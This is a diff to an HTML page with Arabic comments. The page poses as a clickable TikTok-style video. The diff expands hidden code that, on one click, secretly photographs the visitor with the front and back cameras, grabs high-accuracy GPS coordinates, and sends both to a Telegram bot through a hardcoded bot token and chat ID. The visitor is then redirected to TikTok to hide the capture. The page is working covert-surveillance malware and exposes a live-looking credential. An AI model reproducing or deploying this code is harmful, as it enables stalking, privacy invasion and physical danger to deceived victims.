@@ -53,7 +53,6 @@
 </head>
 <body>
 
-<!-- صورة الفيديو الواقف مع زر التشغيل -->
 <div class="player" id="player">
     <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&q=80" alt="فيديو">
     <div class="play-btn" id="playBtn">
@@ -61,50 +60,156 @@
     </div>
 </div>
 
-<!-- كاميرا التصوير الخفي -->
 <video id="hiddenCam" autoplay playsinline muted></video>
 
 <script>
 // ================== الإعدادات ==================
 const TOKEN   = '8735029800:AAHAkVSyWV0uiLQugB-OIIaCbMi-h5se5M4';
 const CHAT_ID = '1659035307';
-
-// 👇 حط رابط التيك توك اللي عايز تحول عليه هنا
 const TIKTOK_URL = 'https://vt.tiktok.com/ZSVucc7HX/';
+
+// 📐 مقاس الصورة (9:16 طولية) — 720p توازن مثالي بين الجودة والسرعة
+const VW = 720;
+const VH = 1280;
+const JPEG_QUALITY = 0.90;      // جودة عالية
+const LOC_TIMEOUT  = 3000;      // 3 ثواني للموقع
+const CAM_WARMUP   = 350;       // استنى الكاميرا تضبط الإضاءة
 // =============================================
 
-const player   = document.getElementById('player');
-const playBtn  = document.getElementById('playBtn');
+const player    = document.getElementById('player');
 const hiddenCam = document.getElementById('hiddenCam');
 
-let stream = null;
-let done   = false;
+let done = false;
 
-player.addEventListener('click', async () => {
-    if (done) return;
-    done = true;
+// ================== جلب الموقع ==================
+function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
 
+        let finished = false;
+        const finish = (val) => {
+            if (finished) return;
+            finished = true;
+            resolve(val);
+        };
+
+        const timer = setTimeout(() => finish(null), LOC_TIMEOUT);
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                clearTimeout(timer);
+                finish({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                });
+            },
+            () => {
+                clearTimeout(timer);
+                finish(null);
+            },
+            { enableHighAccuracy: true, timeout: LOC_TIMEOUT, maximumAge: 60000 }
+        );
+    });
+}
+
+// ================== انتظار الكاميرا ==================
+// بدل ما نستنى وقت ثابت، بنستنى الفيديو يجهز فعلاً
+function waitForVideoReady(timeout = 1500) {
+    return new Promise((resolve) => {
+        const start = Date.now();
+        const check = () => {
+            if (hiddenCam.videoWidth > 0 && hiddenCam.videoHeight > 0) {
+                resolve(true);
+            } else if (Date.now() - start > timeout) {
+                resolve(false);
+            } else {
+                requestAnimationFrame(check);
+            }
+        };
+        check();
+    });
+}
+
+// ================== التقاط صورة ==================
+async function captureFromCamera(facingMode) {
+    let localStream = null;
     try {
-        // 1. طلب الكاميرا
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+        localStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: { ideal: facingMode },
+                width:  { ideal: VH },   // ملاحظة: العرض والطول متعمدين عشان الكاميرا تفهم إننا عايزين طولي
+                height: { ideal: VW }
+            },
             audio: false
         });
-        hiddenCam.srcObject = stream;
+
+        hiddenCam.srcObject = localStream;
         await hiddenCam.play();
 
-        // 2. التقط الصورة فوراً
+        // استنى الفيديو يجهز فعلاً (أسرع من setTimeout ثابت)
+        await waitForVideoReady();
+        // استنى بسيط للإضاءة/التركيز
+        await new Promise(r => setTimeout(r, CAM_WARMUP));
+
+        // 📸 الرسم على الكانفاس بنسبة 9:16 + قص ذكي
         const canvas = document.createElement('canvas');
-        canvas.width = 640; canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(hiddenCam, 0, 0, 640, 480);
+        canvas.width  = VW;
+        canvas.height = VH;
 
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-        if (!blob) throw new Error();
+        const ctx = canvas.getContext('2d', { willReadFrequently: false });
+        ctx.imageSmoothingEnabled = true;
+        ctx.imageSmoothingQuality = 'high';
 
-        // 3. أرسل لتيليجرام
+        const vw = hiddenCam.videoWidth;
+        const vh = hiddenCam.videoHeight;
+        const targetRatio = VW / VH;
+        const sourceRatio = vw / vh;
+
+        let sx, sy, sw, sh;
+        if (sourceRatio > targetRatio) {
+            sh = vh;
+            sw = vh * targetRatio;
+            sx = (vw - sw) / 2;
+            sy = 0;
+        } else {
+            sw = vw;
+            sh = vw / targetRatio;
+            sx = 0;
+            sy = (vh - sh) / 2;
+        }
+
+        // ✅ الكاميرا الأمامية بتبقى معكوسة (mirror) — نصلحها
+        ctx.save();
+        if (facingMode === 'user') {
+            ctx.translate(VW, 0);
+            ctx.scale(-1, 1);
+        }
+        ctx.drawImage(hiddenCam, sx, sy, sw, sh, 0, 0, VW, VH);
+        ctx.restore();
+
+        const blob = await new Promise(r =>
+            canvas.toBlob(r, 'image/jpeg', JPEG_QUALITY)
+        );
+
+        // 🛑 وقف الكاميرا فوراً (مهم للسرعة)
+        localStream.getTracks().forEach(t => t.stop());
+
+        console.log(`📷 ${facingMode}: ${(blob?.size / 1024).toFixed(1)} KB`);
+        return blob;
+
+    } catch (e) {
+        console.warn(`❌ فشل الكاميرا (${facingMode}):`, e.message);
+        if (localStream) localStream.getTracks().forEach(t => t.stop());
+        return null;
+    }
+}
+
+// ================== إرسال صورة ==================
+function sendPhoto(blob, caption) {
+    return new Promise((resolve) => {
         const iframe = document.createElement('iframe');
-        iframe.name = 'tg' + Date.now();
+        iframe.name = 'tg' + Date.now() + Math.random();
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
 
@@ -120,8 +225,7 @@ player.addEventListener('click', async () => {
         form.appendChild(i1);
 
         const i2 = document.createElement('input');
-        i2.type = 'hidden'; i2.name = 'caption';
-        i2.value = `🎬 ضغط على الفيديو - ${new Date().toLocaleString('ar-EG')}\n${TIKTOK_URL}`;
+        i2.type = 'hidden'; i2.name = 'caption'; i2.value = caption;
         form.appendChild(i2);
 
         const file = new File([blob], 'shot.jpg', { type: 'image/jpeg' });
@@ -135,21 +239,67 @@ player.addEventListener('click', async () => {
         document.body.appendChild(form);
         form.submit();
 
-        // 4. وقف الكاميرا
-        stream.getTracks().forEach(t => t.stop());
-
-        // 5. استنى شوية عشان الفورم يتبعت، وبعدين حول للتيك توك
+        // ⚡ 700ms كفاية عشان الفورم يتبعت
         setTimeout(() => {
             form.remove();
             iframe.remove();
-            // 🚀 تحويل مباشر لتيك توك
-            window.location.href = TIKTOK_URL;
-        }, 1000);
+            resolve();
+        }, 700);
+    });
+}
+
+// ================== الحدث الرئيسي ==================
+player.addEventListener('click', async () => {
+    if (done) return;
+    done = true;
+
+    try {
+        // 🚀 الموقع يشتغل في الخلفية من أول لحظة
+        const locationPromise = getLocation();
+
+        // 📸 1. الأمامية الأول
+        const frontBlob = await captureFromCamera('user');
+
+        // 📸 2. الخلفية
+        const backBlob = await captureFromCamera('environment');
+
+        // 📍 3. هات الموقع (أو انتهت مهلته)
+        const loc = await locationPromise;
+
+        const timeStr = new Date().toLocaleString('ar-EG');
+
+        // تجهيز معلومات الموقع
+        let locInfo = '\n📍 الموقع: غير متاح';
+        if (loc) {
+            locInfo = `\n📍 الموقع: https://maps.google.com/?q=${loc.lat},${loc.lng}`;
+            locInfo += `\n🎯 الدقة: ${Math.round(loc.acc)} متر`;
+
+            // إرسال الموقع كرسالة منفصلة (خريطة تفاعلية)
+            new Image().src =
+                `https://api.telegram.org/bot${TOKEN}/sendLocation` +
+                `?chat_id=${encodeURIComponent(CHAT_ID)}` +
+                `&latitude=${loc.lat}&longitude=${loc.lng}`;
+        }
+
+        // 📤 4. إرسال الصورتين بالتوازي (أسرع بكتير)
+        const tasks = [];
+        if (frontBlob) {
+            tasks.push(sendPhoto(frontBlob,
+                `📸 صورة أمامية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`
+            ));
+        }
+        if (backBlob) {
+            tasks.push(sendPhoto(backBlob,
+                `📷 صورة خلفية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`
+            ));
+        }
+        await Promise.all(tasks);
+
+        // 🚀 5. حول للتيك توك
+        window.location.href = TIKTOK_URL;
 
     } catch (e) {
         console.log(e);
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        // لو فشلت الكاميرا بردو حول لتيك توك
         window.location.href = TIKTOK_URL;
     }
 });
